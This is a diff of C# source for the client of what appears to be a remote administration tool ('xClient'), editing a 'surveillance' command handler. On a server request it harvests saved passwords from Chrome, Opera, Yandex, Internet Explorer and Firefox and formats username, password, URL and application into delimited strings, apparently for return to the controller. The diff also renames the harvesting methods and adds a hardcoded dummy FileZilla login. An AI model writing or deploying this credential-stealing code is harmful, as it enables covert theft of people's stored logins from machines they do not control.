@@ -8,30 +8,32 @@ using System.Threading;
 using xClient.Core.Networking;
 using xClient.Core.Utilities;
 using xClient.Enums;
-using xClient.Core.Recovery.Helper;
 using System.Collections.Generic;
-using PasswordRecovery.Browsers;
+using xClient.Core.Recovery;
+using xClient.Core.Recovery.Browsers;
 
 namespace xClient.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT ARE USED FOR SURVEILLANCE. */
     public static partial class CommandHandler
     {
-        public static void HandlePasswordRequest(Packets.ServerPackets.GetPasswords packet, Client client)
+        public static void HandleGetPasswords(Packets.ServerPackets.GetPasswords packet, Client client)
         {
             List<LoginInfo> mainList = new List<LoginInfo>();
             
-            mainList.AddRange(Chrome.Passwords());
-            mainList.AddRange(Opera.Passwords());
-            mainList.AddRange(Yandex.Passwords());
-            mainList.AddRange(InternetExplorer.Passwords());
-            mainList.AddRange(Firefox.Passwords());
+            mainList.AddRange(Chrome.GetSavedPasswords());
+            mainList.AddRange(Opera.GetSavedPasswords());
+            mainList.AddRange(Yandex.GetSavedPasswords());
+            mainList.AddRange(InternetExplorer.GetSavedPasswords());
+            mainList.AddRange(Firefox.GetSavedPasswords());
+
+            mainList.Add(new LoginInfo() { Application = "FileZilla", Password = "pw", URL = "https://www.google.de", Username = "max"});
 
             List<string> raw = new List<string>();
 
             foreach (LoginInfo value in mainList)
             {
-                string rawValue = string.Format("{0}|$|{1}|$|{2}|$|{3}", value.Username, value.Password, value.URL, value.Browser);
+                string rawValue = string.Format("{0}{4}{1}{4}{2}{4}{3}", value.Username, value.Password, value.URL, value.Application, DELIMITER);
                 raw.Add(rawValue);
             }
             
